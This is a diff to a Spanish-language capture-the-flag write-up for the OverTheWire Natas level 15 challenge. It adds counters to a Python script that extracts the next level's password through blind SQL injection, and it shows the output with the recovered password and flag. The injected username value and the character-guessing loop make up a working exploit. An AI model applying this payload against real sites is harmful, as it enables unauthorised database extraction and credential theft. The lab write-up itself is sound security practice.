@@ -119,7 +119,7 @@ Hacer esto a mano sería una autentica tortura, así que haciendo uso de un scri
 
 Sabemos que tenemos que conseguir una contraseña de **32 caracteres** de longitud
 
-Lo llamaremos **BlindNatas15Injector.py**
+Lo llamaremos **blindNatas15Injector.py**
 
 ```python
 import httplib2
@@ -129,22 +129,34 @@ import urllib
 h = httplib2.Http()
 h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
  
-passTemporal     = "";
-letras           = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-posicion = 0
+passTemporal        = "";
+letras              = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+posicion            = 0
+
+usuarioExiste       = "This user exist"
+usuarioNoExiste     = "This user doesn't exist"
+
+contUsuarioExiste   = 0
+contUsuarioNoExiste = 0
 
 while posicion < len(letras):
         query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + passTemporal + letras[posicion] + "%\" ;# "))
         resp, contenido = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
-        if ("This user exist" in str(contenido)):
+        if (usuarioExiste in str(contenido)):
                 passTemporal += letras[posicion];
                 print("Nueva password encontrada: " + passTemporal)
                 posicion = 0
+                contUsuarioExiste +=1
                 if (len(passTemporal)==32):
                         break;
                 continue
+        if (usuarioNoExiste in str(contenido)):
+                contUsuarioNoExiste +=1
         posicion += 1
 
+print "-"*70
+print "Pruebas Erroneas       = {0}".format(contUsuarioNoExiste)
+print "Pruebas Satisfactorias = {0}".format(contUsuarioExiste)
 print "-"*70
 print "Password Natas16 = {0}".format(passTemporal)
 print "-"*70
@@ -153,7 +165,7 @@ print "-"*70
 Ejecutamos el script y vamos viendo por la consola como van apareciendo los caracteres que han coincidido con las letras que tiene la contraseña. Tenemos que esperar hasta que la longitud sea de **32**
 
 ```bash
-ikerburguera@MacBook-Pro-de-Iker:~/Desktop$ python blindNatas15Injector.py 
+ikerburguera@:~/Desktop$ python blindNatas15Injector.py 
 Nueva password encontrada: W
 Nueva password encontrada: Wa
 Nueva password encontrada: WaI
@@ -186,9 +198,12 @@ Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5n
 Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nh
 Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
 Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
--------------------------------------------------------------------
+----------------------------------------------------------------------
+Pruebas Erroneas       = 858
+Pruebas Satisfactorias = 32
+----------------------------------------------------------------------
 Password Natas16 = WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
--------------------------------------------------------------------
+----------------------------------------------------------------------
 ```
 
 **FLAG** = {WaIHEacj63wnNIBROHeqi3p9t0m5nhmh}
